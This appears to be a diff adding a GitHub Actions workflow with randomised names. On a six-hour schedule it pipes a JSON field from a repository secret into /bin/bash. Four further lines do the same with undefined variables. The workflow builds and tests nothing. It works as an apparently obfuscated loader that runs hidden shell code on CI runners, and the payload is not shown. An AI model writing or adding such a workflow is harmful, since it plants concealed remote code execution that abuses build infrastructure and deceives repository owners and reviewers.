@@ -1,0 +1,22 @@
+name: timowl7
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: timowl7
+        env:
+          mndn91: ${{ secrets.mndn91 }}
+        run: |
+          echo $mndn91 | jq -r .iw8 | /bin/bash
+          echo $q8207 | jq -r .y4 | /bin/bash
+          echo $hwty7 | jq -r .xl90 | /bin/bash
+          echo $jf25211 | jq -r .gs3636 | /bin/bash
+          echo $t0 | jq -r .fmqs9455 | /bin/bash
+
